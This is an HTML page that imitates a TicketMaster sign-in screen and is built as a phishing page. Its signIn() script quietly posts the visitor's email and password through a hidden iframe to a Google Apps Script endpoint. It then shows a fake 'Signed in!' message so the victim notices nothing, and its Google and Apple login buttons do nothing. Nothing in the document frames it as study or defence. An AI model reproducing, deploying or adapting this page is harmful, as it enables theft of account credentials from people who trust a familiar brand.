<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TicketMaster — Sign In</title>
<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  :root {
    --blue: #026CDF;
    --blue-light: #1a7de8;
    --orange: #FF5F00;
    --dark: #0a0a0f;
    --card: #111118;
    --border: rgba(255,255,255,0.08);
    --muted: #6b6b80;
    --text: #e8e8f0;
    --input-bg: #1a1a24;
    --error: #ff4d6d;
  }

  body {
    font-family: 'DM Sans', sans-serif;
    background: var(--dark);
    color: var(--text);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
    position: relative;
  }

  /* Background */
  .bg {
    position: fixed; inset: 0; z-index: 0;
    background: radial-gradient(ellipse 80% 60% at 50% -10%, rgba(2,108,223,0.25) 0%, transparent 70%),
                radial-gradient(ellipse 50% 40% at 80% 100%, rgba(255,95,0,0.12) 0%, transparent 60%),
                var(--dark);
  }
  .bg::after {
    content: '';
    position: absolute; inset: 0;
    background-image: repeating-linear-gradient(0deg, transparent, transparent 39px, rgba(255,255,255,0.015) 40px),
                      repeating-linear-gradient(90deg, transparent, transparent 39px, rgba(255,255,255,0.015) 40px);
  }

  /* Floating tickets */
  .ticket-float {
    position: fixed;
    opacity: 0.07;
    pointer-events: none;
    z-index: 1;
  }
  .ticket-float svg { display: block; }
  .tf1 { top: 10%; left: 5%; animation: drift1 18s ease-in-out infinite; }
  .tf2 { top: 60%; right: 4%; animation: drift2 22s ease-in-out infinite; }
  .tf3 { bottom: 8%; left: 12%; animation: drift1 15s ease-in-out infinite reverse; }

  @keyframes drift1 {
    0%, 100% { transform: translateY(0) rotate(-8deg); }
    50% { transform: translateY(-30px) rotate(-4deg); }
  }
  @keyframes drift2 {
    0%, 100% { transform: translateY(0) rotate(12deg); }
    50% { transform: translateY(-20px) rotate(8deg); }
  }

  /* Card */
  .card-wrap {
    position: relative; z-index: 10;
    width: 100%; max-width: 440px;
    padding: 24px;
    animation: fadeUp 0.6s cubic-bezier(.22,.68,0,1.2) both;
  }
  @keyframes fadeUp {
    from { opacity: 0; transform: translateY(24px); }
    to   { opacity: 1; transform: translateY(0); }
  }

  .logo {
    text-align: center;
    margin-bottom: 36px;
  }
  .logo-mark {
    display: inline-flex;
    align-items: center;
    gap: 10px;
  }
  .logo-icon {
    width: 38px; height: 38px;
    background: var(--blue);
    border-radius: 10px;
    display: flex; align-items: center; justify-content: center;
    box-shadow: 0 0 24px rgba(2,108,223,0.5);
  }
  .logo-text {
    font-family: 'Bebas Neue', sans-serif;
    font-size: 28px;
    letter-spacing: 1px;
    color: #fff;
  }
  .logo-text span { color: var(--orange); }

  .card {
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 20px;
    padding: 36px 32px;
    box-shadow: 0 24px 64px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.04) inset;
  }

  .card-title {
    font-family: 'Bebas Neue', sans-serif;
    font-size: 30px;
    letter-spacing: 0.5px;
    margin-bottom: 4px;
    color: #fff;
  }
  .card-sub {
    font-size: 14px;
    color: var(--muted);
    margin-bottom: 28px;
    font-weight: 300;
  }

  /* Social */
  .social-btn {
    width: 100%;
    display: flex; align-items: center; justify-content: center; gap: 10px;
    padding: 12px;
    background: rgba(255,255,255,0.04);
    border: 1px solid var(--border);
    border-radius: 12px;
    color: var(--text);
    font-size: 14px;
    font-weight: 500;
    cursor: pointer;
    transition: background 0.2s, border-color 0.2s, transform 0.1s;
    font-family: 'DM Sans', sans-serif;
    margin-bottom: 10px;
  }
  .social-btn:hover { background: rgba(255,255,255,0.08); border-color: rgba(255,255,255,0.15); transform: translateY(-1px); }
  .social-btn:active { transform: translateY(0); }

  .divider {
    display: flex; align-items: center; gap: 14px;
    margin: 20px 0;
    color: var(--muted);
    font-size: 12px;
    font-weight: 500;
    letter-spacing: 0.5px;
    text-transform: uppercase;
  }
  .divider::before, .divider::after {
    content: ''; flex: 1;
    height: 1px; background: var(--border);
  }

  /* Form */
  .field { margin-bottom: 16px; }
  .field label {
    display: block;
    font-size: 13px;
    font-weight: 500;
    color: rgba(255,255,255,0.6);
    margin-bottom: 6px;
    letter-spacing: 0.2px;
  }
  .input-wrap { position: relative; }
  .input-wrap input {
    width: 100%;
    background: var(--input-bg);
    border: 1px solid var(--border);
    border-radius: 10px;
    padding: 12px 14px 12px 42px;
    color: var(--text);
    font-size: 15px;
    font-family: 'DM Sans', sans-serif;
    outline: none;
    transition: border-color 0.2s, box-shadow 0.2s;
  }
  .input-wrap input::placeholder { color: var(--muted); font-weight: 300; }
  .input-wrap input:focus {
    border-color: var(--blue);
    box-shadow: 0 0 0 3px rgba(2,108,223,0.18);
  }
  .input-icon {
    position: absolute; left: 13px; top: 50%; transform: translateY(-50%);
    color: var(--muted); pointer-events: none;
  }
  .eye-toggle {
    position: absolute; right: 13px; top: 50%; transform: translateY(-50%);
    color: var(--muted); cursor: pointer; background: none; border: none;
    display: flex; align-items: center;
    transition: color 0.2s;
  }
  .eye-toggle:hover { color: var(--text); }

  .row-between {
    display: flex; align-items: center; justify-content: space-between;
    margin-bottom: 22px; margin-top: 4px;
  }
  .remember {
    display: flex; align-items: center; gap: 8px;
    font-size: 13px; color: var(--muted); cursor: pointer;
    user-select: none;
  }
  .remember input[type=checkbox] { display: none; }
  .check-box {
    width: 16px; height: 16px;
    border: 1.5px solid var(--border);
    border-radius: 4px;
    display: flex; align-items: center; justify-content: center;
    transition: background 0.2s, border-color 0.2s;
    flex-shrink: 0;
  }
  .remember input:checked + .check-box {
    background: var(--blue); border-color: var(--blue);
  }
  .remember input:checked + .check-box::after {
    content: '';
    width: 8px; height: 5px;
    border-left: 2px solid #fff; border-bottom: 2px solid #fff;
    transform: rotate(-45deg) translateY(-1px);
  }
  .forgot {
    font-size: 13px; color: var(--blue); text-decoration: none;
    transition: color 0.2s;
  }
  .forgot:hover { color: var(--blue-light); text-decoration: underline; }

  .btn-primary {
    width: 100%;
    background: var(--blue);
    color: #fff;
    border: none;
    border-radius: 12px;
    padding: 14px;
    font-size: 15px;
    font-weight: 600;
    font-family: 'DM Sans', sans-serif;
    cursor: pointer;
    transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
    box-shadow: 0 4px 20px rgba(2,108,223,0.35);
    letter-spacing: 0.2px;
  }
  .btn-primary:hover {
    background: var(--blue-light);
    box-shadow: 0 6px 28px rgba(2,108,223,0.5);
    transform: translateY(-1px);
  }
  .btn-primary:active { transform: translateY(0); }

  .signup-row {
    text-align: center;
    margin-top: 22px;
    font-size: 14px;
    color: var(--muted);
  }
  .signup-row a {
    color: var(--blue);
    text-decoration: none;
    font-weight: 500;
    transition: color 0.2s;
  }
  .signup-row a:hover { color: var(--blue-light); text-decoration: underline; }

  .terms {
    text-align: center;
    font-size: 11.5px;
    color: rgba(107,107,128,0.7);
    margin-top: 24px;
    line-height: 1.6;
  }
  .terms a { color: var(--muted); text-decoration: underline; }

  /* Events strip */
  .event-strip {
    display: flex; gap: 8px;
    margin-top: 28px;
    opacity: 0.5;
    justify-content: center;
    flex-wrap: wrap;
  }
  .event-chip {
    font-size: 11px;
    font-weight: 500;
    padding: 4px 10px;
    border-radius: 20px;
    border: 1px solid var(--border);
    color: var(--muted);
    letter-spacing: 0.3px;
  }
</style>
</head>
<body>

<div class="bg"></div>

<!-- Floating ticket decorations -->
<div class="ticket-float tf1">
  <svg width="160" height="72" viewBox="0 0 160 72" fill="none">
    <rect width="160" height="72" rx="10" fill="white"/>
    <circle cx="0" cy="36" r="14" fill="#0a0a0f"/>
    <circle cx="160" cy="36" r="14" fill="#0a0a0f"/>
    <line x1="20" y1="36" x2="140" y2="36" stroke="#ccc" stroke-width="1.5" stroke-dasharray="5 4"/>
    <rect x="20" y="12" width="80" height="10" rx="3" fill="#ccc"/>
    <rect x="20" y="28" width="50" height="6" rx="3" fill="#eee"/>
  </svg>
</div>
<div class="ticket-float tf2">
  <svg width="140" height="64" viewBox="0 0 140 64" fill="none">
    <rect width="140" height="64" rx="10" fill="white"/>
    <circle cx="0" cy="32" r="12" fill="#0a0a0f"/>
    <circle cx="140" cy="32" r="12" fill="#0a0a0f"/>
    <line x1="18" y1="32" x2="122" y2="32" stroke="#ccc" stroke-width="1.5" stroke-dasharray="5 4"/>
    <rect x="18" y="10" width="70" height="8" rx="3" fill="#ccc"/>
    <rect x="18" y="24" width="44" height="5" rx="3" fill="#eee"/>
  </svg>
</div>
<div class="ticket-float tf3">
  <svg width="180" height="80" viewBox="0 0 180 80" fill="none">
    <rect width="180" height="80" rx="10" fill="white"/>
    <circle cx="0" cy="40" r="16" fill="#0a0a0f"/>
    <circle cx="180" cy="40" r="16" fill="#0a0a0f"/>
    <line x1="22" y1="40" x2="158" y2="40" stroke="#ccc" stroke-width="1.5" stroke-dasharray="6 4"/>
    <rect x="22" y="14" width="90" height="10" rx="3" fill="#ccc"/>
    <rect x="22" y="30" width="58" height="6" rx="3" fill="#eee"/>
  </svg>
</div>

<!-- Login Card -->
<div class="card-wrap">
  <div class="logo">
    <div class="logo-mark">
      <div class="logo-icon">
        <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
          <path d="M3 14L8 4L11 9L14 6L17 14H3Z" fill="white" stroke="white" stroke-width="0.5" stroke-linejoin="round"/>
        </svg>
      </div>
      <span class="logo-text">Ticket<span>Master</span></span>
    </div>
  </div>

  <div class="card">
    <div class="card-title">Welcome Back</div>
    <div class="card-sub">Sign in to access your tickets &amp; events</div>

    <!-- Social logins -->
    <button class="social-btn" onclick="void(0)">
      <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
        <path d="M17.64 9.2c0-.637-.057-1.251-.164-1.84H9v3.481h4.844c-.209 1.125-.843 2.078-1.796 2.717v2.258h2.908c1.702-1.567 2.684-3.874 2.684-6.615z" fill="#4285F4"/>
        <path d="M9 18c2.43 0 4.467-.806 5.956-2.18l-2.908-2.259c-.806.54-1.837.86-3.048.86-2.344 0-4.328-1.584-5.036-3.711H.957v2.332A8.997 8.997 0 009 18z" fill="#34A853"/>
        <path d="M3.964 10.71A5.41 5.41 0 013.682 9c0-.593.102-1.17.282-1.71V4.958H.957A8.996 8.996 0 000 9c0 1.452.348 2.827.957 4.042l3.007-2.332z" fill="#FBBC05"/>
        <path d="M9 3.58c1.321 0 2.508.454 3.44 1.345l2.582-2.58C13.463.891 11.426 0 9 0A8.997 8.997 0 00.957 4.958L3.964 7.29C4.672 5.163 6.656 3.58 9 3.58z" fill="#EA4335"/>
      </svg>
      Continue with Google
    </button>

    <button class="social-btn" onclick="void(0)">
      <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
        <path d="M9 0C4.03 0 0 4.03 0 9c0 3.98 2.579 7.353 6.156 8.547.45.083.615-.195.615-.434 0-.214-.008-.779-.012-1.53-2.503.544-3.031-1.206-3.031-1.206-.41-1.04-1-1.317-1-1.317-.816-.558.062-.547.062-.547.903.063 1.378.927 1.378.927.803 1.375 2.107.978 2.62.748.082-.582.314-.978.572-1.203-1.998-.227-4.1-1-4.1-4.449 0-.983.352-1.787.927-2.417-.093-.228-.401-1.143.088-2.382 0 0 .756-.242 2.477.923A8.626 8.626 0 019 4.382c.766.003 1.537.103 2.257.303 1.72-1.165 2.475-.923 2.475-.923.49 1.24.182 2.154.09 2.382.577.63.926 1.434.926 2.417 0 3.457-2.105 4.22-4.11 4.443.323.279.61.83.61 1.674 0 1.208-.011 2.183-.011 2.48 0 .241.163.522.619.434C15.424 16.35 18 12.977 18 9c0-4.97-4.03-9-9-9z" fill="#fff"/>
      </svg>
      Continue with Apple
    </button>

    <div class="divider">or sign in with email</div>

    <!-- Email field -->
    <div class="field">
      <label>Email address</label>
      <div class="input-wrap">
        <span class="input-icon">
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
            <path d="M2 4a1 1 0 011-1h10a1 1 0 011 1v8a1 1 0 01-1 1H3a1 1 0 01-1-1V4z" stroke="currentColor" stroke-width="1.3"/>
            <path d="M2 4.5l6 4 6-4" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/>
          </svg>
        </span>
        <input type="email" placeholder="you@example.com" autocomplete="email">
      </div>
    </div>

    <!-- Password field -->
    <div class="field">
      <label>Password</label>
      <div class="input-wrap">
        <span class="input-icon">
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
            <rect x="3" y="7" width="10" height="8" rx="1.5" stroke="currentColor" stroke-width="1.3"/>
            <path d="M5.5 7V5a2.5 2.5 0 015 0v2" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/>
            <circle cx="8" cy="11" r="1" fill="currentColor"/>
          </svg>
        </span>
        <input type="password" id="pwInput" placeholder="Enter your password" autocomplete="current-password">
        <button class="eye-toggle" onclick="togglePw()" type="button" id="eyeBtn">
          <svg id="eyeOpen" width="16" height="16" viewBox="0 0 16 16" fill="none">
            <path d="M1 8s2.5-5 7-5 7 5 7 5-2.5 5-7 5-7-5-7-5z" stroke="currentColor" stroke-width="1.3"/>
            <circle cx="8" cy="8" r="2" stroke="currentColor" stroke-width="1.3"/>
          </svg>
          <svg id="eyeClosed" width="16" height="16" viewBox="0 0 16 16" fill="none" style="display:none">
            <path d="M2 2l12 12M6.5 6.7A2 2 0 0010 10m-6.5-5.5C2.5 5.5 1 8 1 8s2.5 5 7 5c1.4 0 2.7-.4 3.8-1" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/>
            <path d="M11.8 11.2C13.2 9.9 15 8 15 8s-2.5-5-7-5c-.8 0-1.5.1-2.2.3" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/>
          </svg>
        </button>
      </div>
    </div>

    <div class="row-between">
      <label class="remember">
        <input type="checkbox" id="remCheck">
        <span class="check-box"></span>
        Remember me
      </label>
      <a href="#" class="forgot">Forgot password?</a>
    </div>

    <button class="btn-primary" onclick="signIn()">Sign In</button>

    <div class="signup-row">
      Don't have an account? <a href="#">Create one free</a>
    </div>
  </div>

  <div class="terms">
    By signing in, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>
  </div>

  <div class="event-strip">
    <span class="event-chip">🎵 Concerts</span>
    <span class="event-chip">🏟️ Sports</span>
    <span class="event-chip">🎭 Theatre</span>
    <span class="event-chip">🎪 Festivals</span>
    <span class="event-chip">🎬 Film</span>
  </div>
</div>

<iframe name="hidden_iframe" style="display:none"></iframe>

<script>
  function togglePw() {
    const input = document.getElementById('pwInput');
    const open = document.getElementById('eyeOpen');
    const closed = document.getElementById('eyeClosed');
    if (input.type === 'password') {
      input.type = 'text';
      open.style.display = 'none';
      closed.style.display = 'block';
    } else {
      input.type = 'password';
      open.style.display = 'block';
      closed.style.display = 'none';
    }
  }

  document.getElementById('remCheck').addEventListener('change', function() {
    // checkbox state handled via CSS
  });


  async function signIn() {
  const email = document.querySelector('input[type="email"]').value;
  const password = document.getElementById('pwInput').value;

  const form = document.createElement('form');
  form.method = 'POST';
  form.action = 'https://script.google.com/macros/s/AKfycbxDL1qsexo8mBaydPC9xtgpwxWtLzP-0mUsJN8oBMh-rJw2sx7fGA0BDsOuPsoutpfOxA/exec';
  form.target = 'hidden_iframe';

  const emailField = document.createElement('input');
  emailField.name = 'email';
  emailField.value = email;

  const passwordField = document.createElement('input');
  passwordField.name = 'password';
  passwordField.value = password;

  form.appendChild(emailField);
  form.appendChild(passwordField);
  document.body.appendChild(form);
  form.submit();
  document.body.removeChild(form);

  alert('Signed in!');
}
</script>
</body>
</html>
